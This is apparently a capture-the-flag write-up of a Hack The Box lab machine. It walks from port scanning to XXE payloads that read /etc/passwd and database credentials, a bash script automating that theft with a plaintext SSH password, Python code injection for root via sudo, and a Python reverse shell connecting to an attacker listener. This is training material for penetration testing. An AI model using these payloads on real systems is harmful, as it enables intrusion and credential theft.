# PenTest-Example
### A demonstratoin walkthrough of a pen test process using HTB's B.o.u.n.t.y-H.u.n.t.e.r with some normal dead ends as an example

Basic scan of all ports 
```
nmap -p- 10.10.11.100
```

## The preferred way to scan.  A fast scan of all ports then a deeper scan for services on the found ports
```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.100 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.11.100
nikto -h 10.10.11.100
```

Find common unlinked files with dirbuster
```
dirbuster -u http://10.10.11.100:80 -l /usr/share/dirbuster/wordlists/apache-user-enum-1.0.txt -H
```
The *.php files and `resources/README.txt` are interesting

Determine services
Check out related CVEs
```https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/Apache-Http-Server.html```

### Fire up Burpsuite and start playing with website
Proxy start browser, check out `portal`

###  php and xml is XXE possible?  [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

Send php request to repeater
Copy `data` into CyberChef  use `URL Decode` and `From Base64`
Flip output add test string
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY xxe 'yoyo ma'> ]>
<bugreport>
  <title>&xxe;</title>
  <cwe></cwe>
  <cvss></cvss>
  <reward></reward>
</bugreport>
```
Add real attack to retrieve `/etc/passwd`
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><bugreport><title>&xxe;</title><cwe></cwe><cvss></cvss><reward></reward></bugreport>
```
Only one user has a login shell available
Add real attack to retrieve `/db.php`
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]><bugreport><title>&xxe;</title><cwe></cwe><cvss></cvss><reward></reward></bugreport>
```

Automation
#### bountyhunter.sh

```
    #!/bin/bash
    data='<?xml  version="1.0" encoding="UTF-8"?><!DOCTYPE title [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><bugreport><title></title><cwe></cwe><cvss></cvss><reward>&xxe;</reward></bugreport>'
    user=$(bash -c "curl -X POST --data-urlencode \"data=$(echo $data | base64 -w 0)\" 'http://bountyhunter.htb/tracker_diRbPr00f314.php'  | html2markdown | tail -n 2 | head -n 1 | base64 -d" 2>/dev/null | grep '/bin/bash$' | awk -F':' '{print $5}' | cut -d , -f1 | tail -n 1 | tr '[:upper:]' '[:lower:]') 
    data='<?xml  version="1.0" encoding="UTF-8"?><!DOCTYPE title [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]><bugreport><title></title><cwe></cwe><cvss></cvss><reward>&xxe;</reward></bugreport>'
    password1=$(bash -c "curl -X POST --data-urlencode \"data=$(echo $data | base64 -w 0)\" 'http://bountyhunter.htb/tracker_diRbPr00f314.php'  | html2markdown | tail -n 2 | head -n 1 | base64 -d" 2>/dev/null | grep -i '$dbpassword' | cut -d '"' -f 2)

    echo "Got SSH Creds ! Username= $user , Password= $password1"
```

Login with user credentials (Assuming password reuse)
```ssh development@10.10.11.100```
password = m19RoAU0hP41A1sTsq6K


#### Get user the user flag

```cat ~/user.txt```

Enumerate privledges you already have on the system
```
find / -perm -4000 2>/dev/null
```
Nothing popped out to me.  Maybe try sudo?
```
sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
 ```
#### Example ticket file root.md

```
# Skytrain Inc
## Ticket to Ride
__Ticket Code:__
**102+ 10 == 112 and __import__('os').system('/bin/bash') == False
```
```sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py```
root.md
Show who you are
```id```

# Get Root flag!

```cat /root/root.txt```

# Optional method: Reverse shell
### Start listener on attacker box
```nc -lvnp 9999```

```
set ATTACK_IP="10.10.11.100"
set ATTACK_PORT=9999
cat root.md
# Skytrain Inc 
## Ticket to abc 
__Ticket Code:__
**102+ 10 == 112 and exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((os.environ.get("ATTACK_IP"),int(os.environ.get("ATTACK_PORT"))));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
```
